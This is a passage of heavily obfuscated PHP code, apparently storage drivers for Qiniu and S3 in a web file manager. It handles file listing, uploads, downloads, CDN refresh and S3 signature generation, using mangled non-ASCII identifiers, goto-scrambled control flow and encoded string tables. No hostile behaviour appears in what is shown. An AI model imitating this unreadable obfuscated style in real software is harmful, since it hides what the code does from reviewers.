•Öæ¨’Î[1165], $eÁ±ø˜…ÚÃ) ? $A”Ä¥¿–Ì = $eÁ±ø˜…ÚÃ[$c •Öæ¨’Î[1196]] : $c •Öæ¨’Î[33]; foreach ($eÁ±ø˜…ÚÃ[$c •Öæ¨’Î[1197]] as $E‚ÇŠßœ©Ø) { $BŠ¤‘¡‘Å = $E‚ÇŠßœ©Ø[$c •Öæ¨’Î[89]]; if ($BÆ¹¿ñÚ±é) { $BŠ¤‘¡‘Å = array($c •Öæ¨’Î[28] => $BŠ¤‘¡‘Å, $c •Öæ¨’Î[77] => $E‚ÇŠßœ©Ø[$c •Öæ¨’Î[1198]]); } $E‹Ôˆ¤Ôê[] = $BŠ¤‘¡‘Å; } if ($A”Ä¥¿–Ì == $c •Öæ¨’Î[33]) { break; } } return $E‹Ôˆ¤Ôê; goto CÇ®º¦ê¿; DÍñŠé“‹¹: $A”Ä¥¿–Ì = $c •Öæ¨’Î[33]; $bßéõ„Äæ× = 1000; $F½Ğè­Î×Â = $c •Öæ¨’Î[33]; goto eØˆ¨Ñ¿·ª; CÇ®º¦ê¿: } public function rename($aè¶‹õ³¼, $fæìÍ–¸õ) { return $this->renameObject($aè¶‹õ³¼, $fæìÍ–¸õ); } public function fileInfo($E§Øô÷À, $EçŠ‘¡¡ó¨ = false, $FöÊ‚ „… = array()) { goto F×®íé×åÔ; b»·ğˆğ§: return $D°Ÿà¼Á©; goto Fç’ÌÉÜ•; F×®íé×åÔ: $BàåƒŠ‘Ú… =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($EçŠ‘¡¡ó¨) { return array($BàåƒŠ‘Ú…[28] => $this->pathThis($E§Øô÷À), $BàåƒŠ‘Ú…[75] => $this->getPathOuter($BàåƒŠ‘Ú…[8] . $E§Øô÷À), $BàåƒŠ‘Ú…[29] => $BàåƒŠ‘Ú…[163], $BàåƒŠ‘Ú…[77] => isset($FöÊ‚ „…[$BàåƒŠ‘Ú…[1198]]) ? $FöÊ‚ „…[$BàåƒŠ‘Ú…[1198]] : 0, $BàåƒŠ‘Ú…[156] => $this->ext($E§Øô÷À)); } $D°Ÿà¼Á© = array($BàåƒŠ‘Ú…[28] => $this->pathThis($E§Øô÷À), $BàåƒŠ‘Ú…[75] => $this->getPathOuter($BàåƒŠ‘Ú…[8] . $E§Øô÷À), $BàåƒŠ‘Ú…[29] => $BàåƒŠ‘Ú…[163], $BàåƒŠ‘Ú…[193] => 0, $BàåƒŠ‘Ú…[106] => 0, $BàåƒŠ‘Ú…[77] => 0, $BàåƒŠ‘Ú…[156] => $this->ext($E§Øô÷À), $BàåƒŠ‘Ú…[194] => !0, $BàåƒŠ‘Ú…[195] => !0); goto càô†—·‹; càô†—·‹: if (empty($FöÊ‚ „…)) { $FöÊ‚ „… = $this->objectMeta($E§Øô÷À); if (!$FöÊ‚ „…) { return $D°Ÿà¼Á©; } } if (isset($FöÊ‚ „…[$BàåƒŠ‘Ú…[1199]])) { $D°Ÿà¼Á©[$BàåƒŠ‘Ú…[193]] = $FöÊ‚ „…[$BàåƒŠ‘Ú…[1199]]; } if (isset($FöÊ‚ „…[$BàåƒŠ‘Ú…[1198]])) { $D°Ÿà¼Á©[$BàåƒŠ‘Ú…[77]] = $FöÊ‚ „…[$BàåƒŠ‘Ú…[1198]]; } goto b»·ğˆğ§; Fç’ÌÉÜ•: } public function folderInfo($Bš±°‚í¸±, $CåÀ±ÒÙ¿± = false) { goto E•§ÄîË¹š; C‰Œ¿—¤«: return $B™·ÒÂÉÆË; goto BƒÈçÙ‰°Ó; E•§ÄîË¹š: $Aİ×‚¢öŞÀ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($CåÀ±ÒÙ¿±) { return array($Aİ×‚¢öŞÀ[28] => $this->pathThis($Bš±°‚í¸±), $Aİ×‚¢öŞÀ[75] => $this->getPathOuter($Aİ×‚¢öŞÀ[8] . $Bš±°‚í¸±), $Aİ×‚¢öŞÀ[29] => $Aİ×‚¢öŞÀ[76]); } $B™·ÒÂÉÆË = array($Aİ×‚¢öŞÀ[28] => $this->pathThis($Bš±°‚í¸±), $Aİ×‚¢öŞÀ[75] => $this->getPathOuter($Aİ×‚¢öŞÀ[8] . $Bš±°‚í¸±), $Aİ×‚¢öŞÀ[29] => $Aİ×‚¢öŞÀ[76], $Aİ×‚¢öŞÀ[193] => 0, $Aİ×‚¢öŞÀ[106] => 0, $Aİ×‚¢öŞÀ[1144] => !0, $Aİ×‚¢öŞÀ[1145] => !0); goto aë‰‡¹¡´; aë‰‡¹¡´: $Bš±°‚í¸± = rtrim($Bš±°‚í¸±, $Aİ×‚¢öŞÀ[8]) . $Aİ×‚¢öŞÀ[8]; $d›Ë„öÏ = $this->objectMeta($Bš±°‚í¸±); if (isset($d›Ë„öÏ[$Aİ×‚¢öŞÀ[1199]])) { $B™·ÒÂÉÆË[$Aİ×‚¢öŞÀ[193]] = $d›Ë„öÏ[$Aİ×‚¢öŞÀ[1199]]; } goto C‰Œ¿—¤«; BƒÈçÙ‰°Ó: } public function listPath($Dì²˜‡ìé­, $FÈÛĞ•‘äœ = false) { goto a¯Şï†ö¾; Dçæ¦éœ“„: $a›ğ“™®¢Ï = $e¨œŒÏ”ù’[33]; $a“Ô®ä¶‹õ = 1000; $DÊÕÇ¹¹å = $e¨œŒÏ”ù’[8]; goto e÷—Û”½•ø; e÷—Û”½•ø: $CÅöÀÎÖçÅ = $aÅ¼›‹‚ÒÌ = array(); while (!0) { list($aå¹¦Ì±½ , $D³ôÆÊ‚êÌ) = $this->bucketManager->listFiles($this->bucket, $Fß¿Œ·Á–Ö, $a›ğ“™®¢Ï, $a“Ô®ä¶‹õ, $DÊÕÇ¹¹å); if ($D³ôÆÊ‚êÌ) { return !1; } $a›ğ“™®¢Ï = array_key_exists($e¨œŒÏ”ù’[1165], $aå¹¦Ì±½ ) ? $a›ğ“™®¢Ï = $aå¹¦Ì±½ [$e¨œŒÏ”ù’[1196]] : $e¨œŒÏ”ù’[33]; if (isset($aå¹¦Ì±½ [$e¨œŒÏ”ù’[1200]])) { foreach ($aå¹¦Ì±½ [$e¨œŒÏ”ù’[1200]] as $f•Œ©ò‚èÎ) { if ($f•Œ©ò‚èÎ == $Fß¿Œ·Á–Ö) { continue; } $CÅöÀÎÖçÅ[] = $this->folderInfo($f•Œ©ò‚èÎ, $FÈÛĞ•‘äœ); } } if (isset($aå¹¦Ì±½ [$e¨œŒÏ”ù’[1197]])) { foreach ($aå¹¦Ì±½ [$e¨œŒÏ”ù’[1197]] as $a­Òìê¢”ò) { if ($a­Òìê¢”ò[$e¨œŒÏ”ù’[89]] == $Fß¿Œ·Á–Ö) { continue; } $aÅ¼›‹‚ÒÌ[] = $this->fileInfo($a­Òìê¢”ò[$e¨œŒÏ”ù’[89]], $FÈÛĞ•‘äœ, $a­Òìê¢”ò); } } if ($a›ğ“™®¢Ï == $e¨œŒÏ”ù’[33]) { break; } } return array($e¨œŒÏ”ù’[74] => $CÅöÀÎÖçÅ, $e¨œŒÏ”ù’[73] => $aÅ¼›‹‚ÒÌ); goto D´¨ºêç’„; a¯Şï†ö¾: $e¨œŒÏ”ù’ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Dì²˜‡ìé­ = trim($Dì²˜‡ìé­, $e¨œŒÏ”ù’[8]); $Fß¿Œ·Á–Ö = empty($Dì²˜‡ìé­) ? $e¨œŒÏ”ù’[33] : $Dì²˜‡ìé­ . $e¨œŒÏ”ù’[8]; goto Dçæ¦éœ“„; D´¨ºêç’„: } public function has($Cæ¯ÇŠƒÅÀ, $Fåò‘ÅèÔ = false, $bãÌ»Š³ = true) { goto d¬„ÓÉ›Ê·; d¬„ÓÉ›Ê·: $BÅ¨æĞ›¾± =& $_SERVER[ºÖÙÂŒäÉê‡]; $Cæ¯ÇŠƒÅÀ = trim($Cæ¯ÇŠƒÅÀ, $BÅ¨æĞ›¾±[8]); $E³¸çë˜¤é = empty($Cæ¯ÇŠƒÅÀ) ? $BÅ¨æĞ›¾±[33] : $Cæ¯ÇŠƒÅÀ . $BÅ¨æĞ›¾±[8]; goto AĞ­‚¤»Àæ; AĞ­‚¤»Àæ: $AÏ³ºùÆ†· = $BÅ¨æĞ›¾±[33]; $cõò³¿Óİ = 1000; $aÓ¿À¥Ãë = $BÅ¨æĞ›¾±[8]; goto b®Î¥ˆà»; BŒ»ŒØÚÏ£: if ($Fåò‘ÅèÔ) { return array($BÅ¨æĞ›¾±[197] => $cïâ‡–šÇğ, $BÅ¨æĞ›¾±[198] => $D‹£“Î£Ë); } return !1; goto b®Æâ·óµ; b®Î¥ˆà»: $cïâ‡–šÇğ = 0; $D‹£“Î£Ë = 0; while (!0) { list($aó°‰œŒÖË, $e¹‚ÕêËß) = $this->bucketManager->listFiles($this->bucket, $E³¸çë˜¤é, $AÏ³ºùÆ†·, $cõò³¿Óİ, $aÓ¿À¥Ãë); if ($e¹‚ÕêËß) { return !1; } $AÏ³ºùÆ†· = array_key_exists($BÅ¨æĞ›¾±[1165], $aó°‰œŒÖË) ? $AÏ³ºùÆ†· = $aó°‰œŒÖË[$BÅ¨æĞ›¾±[1196]] : $BÅ¨æĞ›¾±[33]; if ($Fåò‘ÅèÔ) { if (!empty($aó°‰œŒÖË[$BÅ¨æĞ›¾±[1197]])) { $cïâ‡–šÇğ += count($aó°‰œŒÖË[$BÅ¨æĞ›¾±[1197]]); } if (!empty($aó°‰œŒÖË[$BÅ¨æĞ›¾±[1200]])) { $D‹£“Î£Ë += count($aó°‰œŒÖË[$BÅ¨æĞ›¾±[1200]]); } if ($AÏ³ºùÆ†· === $BÅ¨æĞ›¾±[33]) { break; } continue; } if ($bãÌ»Š³) { if (!empty($aó°‰œŒÖË[$BÅ¨æĞ›¾±[1197]])) { return !0; } } else { if (!empty($aó°‰œŒÖË[$BÅ¨æĞ›¾±[1200]])) { return !0; } } if ($AÏ³ºùÆ†· == $BÅ¨æĞ›¾±[33]) { break; } } goto BŒ»ŒØÚÏ£; b®Æâ·óµ: } public function listAll($aÑš˜‹íµ) { $Dİì¡Ö¹éÆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dÔ‹ËóÄĞ = $this->fileList($aÑš˜‹íµ, 1); $AÙå×òÍÀµ = array(); foreach ($dÔ‹ËóÄĞ as $cìŠÒ·ÀÇ²) { $AÙå×òÍÀµ[$cìŠÒ·ÀÇ²[$Dİì¡Ö¹éÆ[28]]] = $cìŠÒ·ÀÇ²[$Dİì¡Ö¹éÆ[77]]; } return $this->listAllFiles($aÑš˜‹íµ, array_keys($AÙå×òÍÀµ), $AÙå×òÍÀµ); } public function canRead($eåË‚­ò×) { return $this->exist($eåË‚­ò×) ? !0 : !1; } public function canWrite($f‹±·–ŞÙí) { return $this->exist($f‹±·–ŞÙí) ? !0 : !1; } public function getContent($Cš‰µ‚«ÅÙ) { return $this->fileSubstr($Cš‰µ‚«ÅÙ, 0, -1); } public function setContent($CÒí¬Ûİ“, $aŞ½§˜„Ò = '') { $A‰Ã¦¨©¦“ = $this->tempFile($this->pathThis($CÒí¬Ûİ“)); file_put_contents($A‰Ã¦¨©¦“, $aŞ½§˜„Ò); if ($this->upload($CÒí¬Ûİ“, $A‰Ã¦¨©¦“)) { $this->tempFileRemve($A‰Ã¦¨©¦“); return !0; } return !1; } public function refreshUrls($bõ·‚ö ) { goto Aó¹Àç¸ö; dì„²É¸: return $d¿øİ¹ÂËÑ[$B†öé§©…[1201]] == $B†öé§©…[693] ? !0 : !1; goto a¶Ù°Ëòá; B×æ­£ªÇÑ: $Cè²Çä‘Ô = new Qiniu\Cdn\CdnManager($this->auth); list($d¿øİ¹ÂËÑ, $FÆ½‘Ã×) = $Cè²Çä‘Ô->refreshUrls($E¹º›ä†áÜ); if ($FÆ½‘Ã×) { return !1; } goto dì„²É¸; Aó¹Àç¸ö: $B†öé§©… =& $_SERVER[ºÖÙÂŒäÉê‡]; $E¹º›ä†áÜ = array(); if (is_array($bõ·‚ö )) { foreach ($bõ·‚ö  as $e¬Ö‡º¾ê) { $E¹º›ä†áÜ[] = $this->link($e¬Ö‡º¾ê); } } else { $E¹º›ä†áÜ[] = $this->link($bõ·‚ö ); } goto B×æ­£ªÇÑ; a¶Ù°Ëòá: } public function fileSubstr($CÖ¥¼å¼èä, $C¦Û£Â‰çÍ, $aÜ³Õ˜†ª) { $CòË¬¾ÓÚİ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!($B¸¥Õ²¬™ = $this->link($CÖ¥¼å¼èä))) { return !1; } $A•ÀË¨Ğ = !1; if ($aÜ³Õ˜†ª > 0) { $E°ŒÄ«õÈÔ = $C¦Û£Â‰çÍ + $aÜ³Õ˜†ª - 1; $A•ÀË¨Ğ = array($CòË¬¾ÓÚİ[1202] . $C¦Û£Â‰çÍ . $CòË¬¾ÓÚİ[416] . $E°ŒÄ«õÈÔ); } $aè¿Ï––†ˆ = url_request($B¸¥Õ²¬™, $CòË¬¾ÓÚİ[222], !1, $A•ÀË¨Ğ); return $aè¿Ï––†ˆ[$CòË¬¾ÓÚİ[686]] ? $aè¿Ï––†ˆ[$CòË¬¾ÓÚİ[1024]] : !1; } public function upload($CâÑ¯¼ëå´, $dÅ‚¾’á”Œ, $F½¾¾©Ø¡ = false, $Fƒ–æ‘ë× = REPEAT_REPLACE) { $EôÕôÅ¬º = new Qiniu\Storage\UploadManager(); $AÜ¡¸ğš = $this->auth->uploadToken($this->bucket, $CâÑ¯¼ëå´); $D²™Ü‘‘âá = get_file_mime(get_path_ext($dÅ‚¾’á”Œ)); list($dˆâ½é¬ˆ, $cÓ±ˆí˜Š) = $EôÕôÅ¬º->putFile($AÜ¡¸ğš, $CâÑ¯¼ëå´, $dÅ‚¾’á”Œ, null, $D²™Ü‘‘âá); return $cÓ±ˆí˜Š ? !1 : $this->getPathOuter($CâÑ¯¼ëå´); } public function uploadFormData($dÍç¥•„÷, $d¡—÷ÖÚ˜ò = 3600) { return $this->uploadToken($dÍç¥•„÷, $d¡—÷ÖÚ˜ò); } public function multiUploadFormData($DõÛ‘ö»‡¶, $b§Ù¹Í¢Š = 3600) { return $this->uploadToken($DõÛ‘ö»‡¶, $b§Ù¹Í¢Š); } private function uploadToken($F™…Åæ¨ö, $b¦“ßâİÉ² = 3600) { goto C°³èÉ‡›; C°³èÉ‡›: $B˜±È…©¼¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cùˆ›¸Œ›‹ = $b¦“ßâİÉ²; $f“Œ°ÆÂÂœ = array($B˜±È…©¼¤[1203] => $B˜±È…©¼¤[1204]); goto cÓÅğÒ¡á…; cÓÅğÒ¡á…: $E¾êÙåÍç« = null; $a§ƒØŠ¦¸ = $this->auth->uploadToken($this->bucket, $E¾êÙåÍç«, $cùˆ›¸Œ›‹, $f“Œ°ÆÂÂœ, !0); $Eˆ«…ƒ²“ = empty($this->region) || $this->region == $B˜±È…©¼¤[1205] ? $B˜±È…©¼¤[33] : $B˜±È…©¼¤[416] . $this->region; goto aÔàÅÔİÙÇ; aÔàÅÔİÙÇ: $Cå¶³Ş£ˆ = http_type() . "\72\x2f\x2f\165\x70\154\x6f\141\144{$Eˆ«…ƒ²“}\56\x71\x69\156\151\165\160\56\x63\x6f\x6d\57"; return array($B˜±È…©¼¤[1206] => $a§ƒØŠ¦¸, $B˜±È…©¼¤[1207] => $Cå¶³Ş£ˆ); goto Bà¶Ô¤Ì½õ; Bà¶Ô¤Ì½õ: } public function download($bóŠæ–Ÿ®‰, $F‰”ÖâÌë) { goto d¡Ìè‡¼çâ; d¡Ìè‡¼çâ: $Aë¨‘ÔŒÛš = IO::getPathInner(IO::mkfile($F‰”ÖâÌë)); if (!($bˆ³¼™ñÔ„ = $this->link($bóŠæ–Ÿ®‰))) { return !1; } $B¸™Èğ“Èê = 0; goto B¨É—ÛéÌœ; B¨É—ÛéÌœ: $EÔ†Í‰©ß¬ = 1024 * 200; $d”É™Ç«İ¸ = fopen($Aë¨‘ÔŒÛš, $_SERVER[ºÖÙÂŒäÉê‡][1208]); while (!0) { $a°…Éã´Âã = $this->fileSubstr($bóŠæ–Ÿ®‰, $B¸™Èğ“Èê, $EÔ†Í‰©ß¬); if ($a°…Éã´Âã === !1) { return !1; } fwrite($d”É™Ç«İ¸, $a°…Éã´Âã); $B¸™Èğ“Èê += $EÔ†Í‰©ß¬; if (strlen($a°…Éã´Âã) < $EÔ†Í‰©ß¬) { break; } } goto b¹…ª‘ãÛ…; b¹…ª‘ãÛ…: fclose($d”É™Ç«İ¸); return $F‰”ÖâÌë; goto eÜİà®«ë; eÜİà®«ë: } public function link($A˜õÙôå—¦, $cœ¯Ê†ÁÈ = '') { if (!$this->isFile($A˜õÙôå—¦)) { return !1; } $fæºŒ˜™Î– = $this->getHost() . $_SERVER[ºÖÙÂŒäÉê‡][8] . $this->pathEncode($A˜õÙôå—¦) . $cœ¯Ê†ÁÈ; return $this->auth->privateDownloadUrl($fæºŒ˜™Î–, 3600 * 12); } public function fileOut($dáˆÎ„óÀÄ, $b‘¨“‡…³ = false, $BÓä¦ºÁ¿ö = false, $DÔ•´‹¨¬ë = '') { $dêİ÷¯†ğÈ =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$BÓä¦ºÁ¿ö) { $BÓä¦ºÁ¿ö = $this->pathThis($dáˆÎ„óÀÄ); } $aöĞëÛ˜êº = $b‘¨“‡…³ ? $dêİ÷¯†ğÈ[1209] . rawurlencode($BÓä¦ºÁ¿ö) : $dêİ÷¯†ğÈ[33]; $F‚™ŸĞê«ù = $this->link($dáˆÎ„óÀÄ, $aöĞëÛ˜êº); $this->fileOutLink($F‚™ŸĞê«ù); } public function fileOutServer($bÁÜç®’¬ç, $aËà¬…±ÓÍ = false, $fÙ”šê¨µ = false, $F‰Ÿ¡ù‰åó = '') { parent::fileOut($bÁÜç®’¬ç, $aËà¬…±ÓÍ, $fÙ”šê¨µ, $F‰Ÿ¡ù‰åó); } public function fileOutImage($fÚæ‘ŒŠ²İ, $C·®îåå¼ = 250) { $aƒì»ªÂ­ë = $this->link($fÚæ‘ŒŠ²İ, $_SERVER[ºÖÙÂŒäÉê‡][1210] . $C·®îåå¼); $this->fileOutLink($aƒì»ªÂ­ë); } public function fileOutImageServer($AÖë»Šá˜, $EÀœˆŞó‰ê = 250) { parent::fileOutImage($AÖë»Šá˜, $EÀœˆŞó‰ê); } public function hashMd5($dÑæ ‘” È) { $CÇ¦°ëÏ´ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cÇ›šÍªßÎ = $this->objectMeta($dÑæ ‘” È); return isset($cÇ›šÍªßÎ[$CÇ¦°ëÏ´[202]]) ? $cÇ›šÍªßÎ[$CÇ¦°ëÏ´[202]] : !1; $cøÖ½ù±±‘ = $this->link($dÑæ ‘” È, $CÇ¦°ëÏ´[1211]); } public function size($C›¿ŠŒ¬‡Š) { $C‡Û®†»§ƒ = $this->objectMeta($C›¿ŠŒ¬‡Š); return $C‡Û®†»§ƒ ? $C‡Û®†»§ƒ[$_SERVER[ºÖÙÂŒäÉê‡][77]] : 0; } public function info($f´Ö˜º©¨) { if ($this->isFolder($f´Ö˜º©¨)) { return $this->folderInfo($f´Ö˜º©¨); } else { if ($this->isFile($f´Ö˜º©¨)) { return $this->fileInfo($f´Ö˜º©¨); } } return !1; } public function exist($cñè…š™ä·) { return $this->isFile($cñè…š™ä·) || $this->isFolder($cñè…š™ä·); } public function isFile($e™¥·•ëÄ) { return !$this->isFolder($e™¥·•ëÄ) && $this->objectMeta($e™¥·•ëÄ); } public function isFolder($BƒµÂÅºÑã) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][228], $BƒµÂÅºÑã); } protected function objectMeta($b‹Í¨Èİñ¬) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][229], $b‹Í¨Èİñ¬); } protected function _objectMeta($fò±¯¤ÒÁ) { $fªâÒÈâîÉ =& $_SERVER[ºÖÙÂŒäÉê‡]; list($E¥§ášŸñ¦, $E‹²‚ğÉµ¤) = $this->bucketManager->stat($this->bucket, $fò±¯¤ÒÁ); if ($E¥§ášŸñ¦) { $E¥§ášŸñ¦[$fªâÒÈâîÉ[77]] = intval($E¥§ášŸñ¦[$fªâÒÈâîÉ[1198]]); } return $E¥§ášŸñ¦; } protected function _isFolder($cŸÛÊï†Á) { $eÎÀî£‡…Ò =& $_SERVER[ºÖÙÂŒäÉê‡]; list($aá©†İï—Î, $aš¡º•¬¿à) = $this->bucketManager->listFiles($this->bucket, trim($cŸÛÊï†Á, $eÎÀî£‡…Ò[8]) . $eÎÀî£‡…Ò[8], $eÎÀî£‡…Ò[33], 1, $eÎÀî£‡…Ò[8]); return !empty($aá©†İï—Î[$eÎÀî£‡…Ò[1197]]) || !empty($aá©†İï—Î[$eÎÀî£‡…Ò[1200]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($Fš×âöª¯„) { parent::__construct($Fš×âöª¯„); } public function uploadFormData($eİ–İššô, $B¸ã¦‘¯ = 3600) { goto aŒ³Œ“¸“«; eêÅÆöå¯Ø: $c”É¢·ò = $a­Ç½¿ÈÌ[59]; $e•˜Øí¸¬ô = gmdate($a­Ç½¿ÈÌ[1117]); $a†õÉŞœòë = gmdate($a­Ç½¿ÈÌ[687]); goto B†Ííæ±ˆ»; aºâö° ‡‡: $dº—Áß›ĞŸ = array($a­Ç½¿ÈÌ[205] => $a­Ç½¿ÈÌ[33], $a­Ç½¿ÈÌ[1128] => $a­Ç½¿ÈÌ[33], $a­Ç½¿ÈÌ[1087] => $E±‚—“¿¹”, $a­Ç½¿ÈÌ[1091] => $eæ©ÛÈëÇ…, $a­Ç½¿ÈÌ[1095] => $f£°ÊĞã–¿, $a­Ç½¿ÈÌ[1129] => $c¢ã¬Ï°á—, $a­Ç½¿ÈÌ[1130] => $c§Ïàó¯Çï, $a­Ç½¿ÈÌ[1131] => $e•˜Øí¸¬ô, $a­Ç½¿ÈÌ[1132] => $fÃ¨•ÅÑá, $a­Ç½¿ÈÌ[1133] => $A›ËĞ×É°Ë, $a­Ç½¿ÈÌ[165] => $this->getHost()); return $dº—Áß›ĞŸ; goto Fæ²È¸©­¡; BÃƒƒç¨Ô¨: $f£°ÊĞã–¿ = base64_encode(json_encode($a••³ŸÒš)); $CöÎÈ°ê—Ş = hash_hmac($a­Ç½¿ÈÌ[1126], $a†õÉŞœòë, $a­Ç½¿ÈÌ[1127] . $this->secret, !0); $f¦“Ä·É = hash_hmac($a­Ç½¿ÈÌ[1126], $this->region, $CöÎÈ°ê—Ş, !0); goto e‰«ÈÉ¢¿ô; aŒ³Œ“¸“«: $a­Ç½¿ÈÌ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E±‚—“¿¹” = $a­Ç½¿ÈÌ[191]; $c§Ïàó¯Çï = $a­Ç½¿ÈÌ[1116]; goto eêÅÆöå¯Ø; f”»º²­¹Ñ: $c£‚¢¾Í‰® = array($this->accessKey, $a†õÉŞœòë, $this->region, $c”É¢·ò, $EÀáÛÑÄí); $c¢ã¬Ï°á— = implode($a­Ç½¿ÈÌ[8], $c£‚¢¾Í‰®); $a••³ŸÒš = array($a­Ç½¿ÈÌ[1085] => gmdate($a­Ç½¿ÈÌ[1084], strtotime($a­Ç½¿ÈÌ[1119])), $a­Ç½¿ÈÌ[1086] => array(array($a­Ç½¿ÈÌ[1088] => $this->bucket), array($a­Ç½¿ÈÌ[1087] => $E±‚—“¿¹”), array($a­Ç½¿ÈÌ[1089], $a­Ç½¿ÈÌ[1090], $a­Ç½¿ÈÌ[33]), array($a­Ç½¿ÈÌ[1089], $a­Ç½¿ÈÌ[1120], $a­Ç½¿ÈÌ[33]), array($a­Ç½¿ÈÌ[1089], $a­Ç½¿ÈÌ[1121], $a­Ç½¿ÈÌ[33]), array($a­Ç½¿ÈÌ[1091] => $eæ©ÛÈëÇ…), array($a­Ç½¿ÈÌ[1122] => $c¢ã¬Ï°á—), array($a­Ç½¿ÈÌ[1123] => $c§Ïàó¯Çï), array($a­Ç½¿ÈÌ[1124] => $e•˜Øí¸¬ô), array($a­Ç½¿ÈÌ[1125] => $fÃ¨•ÅÑá))); goto BÃƒƒç¨Ô¨; e‰«ÈÉ¢¿ô: $AÑ°ØëÆê = hash_hmac($a­Ç½¿ÈÌ[1126], $c”É¢·ò, $f¦“Ä·É, !0); $AêœˆÁÒÑ = hash_hmac($a­Ç½¿ÈÌ[1126], $EÀáÛÑÄí, $AÑ°ØëÆê, !0); $A›ËĞ×É°Ë = hash_hmac($a­Ç½¿ÈÌ[1126], $f£°ÊĞã–¿, $AêœˆÁÒÑ); goto aºâö° ‡‡; B†Ííæ±ˆ»: $EÀáÛÑÄí = $a­Ç½¿ÈÌ[1118]; $fÃ¨•ÅÑá = $B¸ã¦‘¯ . $a­Ç½¿ÈÌ[33]; $eæ©ÛÈëÇ… = $a­Ç½¿ÈÌ[1083]; goto f”»º²­¹Ñ; Fæ²È¸©­¡: } public function multiUploadFormData($Dà—ÄŒËÛĞ, $Eã×‚¡“¿ƒ = 3600) { $Bğ·“ò±Ó… =& $_SERVER[ºÖÙÂŒäÉê‡]; $C»ôÓÒÒ™£ = gmdate($Bğ·“ò±Ó…[1212]); $E¹¼¦ÔñÃï = array(); $DöÛ­Ú‹Îª = $this->client->getUploadId($this->bucket, $Dà—ÄŒËÛĞ, $E¹¼¦ÔñÃï); if (!$DöÛ­Ú‹Îª) { return !1; } return array($Bğ·“ò±Ó…[215] => $DöÛ­Ú‹Îª, $Bğ·“ò±Ó…[165] => $this->getHost() . $Bğ·“ò±Ó…[8] . $this->pathEncode($Dà—ÄŒËÛĞ), $Bğ·“ò±Ó…[216] => $C»ôÓÒÒ™£, $Bğ·“ò±Ó…[89] => $Dà—ÄŒËÛĞ); } public function multiUploadAuthData($E´¥Ä¾õ©, $d†ÖòŸÜ´ = array()) { goto B»‰Àù®ì; cíÜ„½²¶˜: if (isset($d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[1213]])) { $a¶ğŸ¤èñ[$CÊÍ½Éİ”Ã[1214]] = $d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[1213]]; } $Eë‘İ¢ÏÈ = explode($CÊÍ½Éİ”Ã[167], $this->getHost()); $b·ŸÎ¥Ô¡‹ = array($CÊÍ½Éİ”Ã[1215] => $Eë‘İ¢ÏÈ[1], $CÊÍ½Éİ”Ã[1216] => $CÊÍ½Éİ”Ã[33], $CÊÍ½Éİ”Ã[205] => $CÊÍ½Éİ”Ã[115], $CÊÍ½Éİ”Ã[1128] => $d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[77]]); goto C¶»´›ôæä; CÀÜÁæ¶°•: unset($d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[89]]); if (isset($d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[217]])) { return $this->listUploadParts($E³âŒ§†…¡, $d†ÖòŸÜ´); } $a¶ğŸ¤èñ = array(); goto cíÜ„½²¶˜; C¶»´›ôæä: $Eˆßí„ùø = $CÊÍ½Éİ”Ã[220]; $d“‰Ç£®ÈŞ = $CÊÍ½Éİ”Ã[8] . $this->pathEncode($E³âŒ§†…¡) . $aÇ®¦„ìÖø; $d”ÄŸÃö = $this->client->__getSignatureV4($a¶ğŸ¤èñ, $b·ŸÎ¥Ô¡‹, $Eˆßí„ùø, $d“‰Ç£®ÈŞ); goto B ¾ ¦¥¢“; B ¾ ¦¥¢“: if (strpos($aÇ®¦„ìÖø, $CÊÍ½Éİ”Ã[219]) === 0) { if (isset($a¶ğŸ¤èñ[$CÊÍ½Éİ”Ã[1214]])) { $e…ìòª‚Ã = $a¶ğŸ¤èñ[$CÊÍ½Éİ”Ã[1214]]; } else { if (isset($d”ÄŸÃö[$CÊÍ½Éİ”Ã[1214]])) { $e…ìòª‚Ã = $d”ÄŸÃö[$CÊÍ½Éİ”Ã[1214]]; } else { $e…ìòª‚Ã = hash($CÊÍ½Éİ”Ã[1126], $CÊÍ½Éİ”Ã[33]); } } return array($CÊÍ½Éİ”Ã[225] => $d”ÄŸÃö[$CÊÍ½Éİ”Ã[225]], $CÊÍ½Éİ”Ã[1214] => $e…ìòª‚Ã, $CÊÍ½Éİ”Ã[216] => $d”ÄŸÃö[$CÊÍ½Éİ”Ã[1217]]); } return $d”ÄŸÃö[$CÊÍ½Éİ”Ã[225]]; goto D¶ëÏõŞ»£; B»‰Àù®ì: $CÊÍ½Éİ”Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÇ®¦„ìÖø = isset($d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[156]]) ? $d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[156]] : $CÊÍ½Éİ”Ã[33]; $E³âŒ§†…¡ = $d†ÖòŸÜ´[$CÊÍ½Éİ”Ã[89]]; goto CÀÜÁæ¶°•; D¶ëÏõŞ»£: } public function listUploadParts($cÌÏ—½éğ½, $E“ÈÊ†»ÊÍ = array()) { goto Bø¯¨İ¬Îš; FÉ—›æ²ˆ: if (!$a©†Ì…÷Š) { return !1; } $eÇÕÆ’Í = $Céñ‘èÏœ“[1218]; foreach ($a©†Ì…÷Š as $Dé›´»·‘¾) { $eÇÕÆ’Í .= $Céñ‘èÏœ“[1219] . "\x3c\120\x61\x72\164\x4e\x75\x6d\142\x65\162\76{$Dé›´»·‘¾[$Céñ‘èÏœ“[1170]]}\74\x2f\x50\141\x72\x74\x4e\165\155\x62\x65\162\76\xa" . "\74\105\x54\141\147\76{$Dé›´»·‘¾[$Céñ‘èÏœ“[1171]]}\74\57\x45\124\141\x67\x3e\12" . $Céñ‘èÏœ“[1220]; } goto aëí†„Ÿê¹; fØÅ×ÒË­Í: 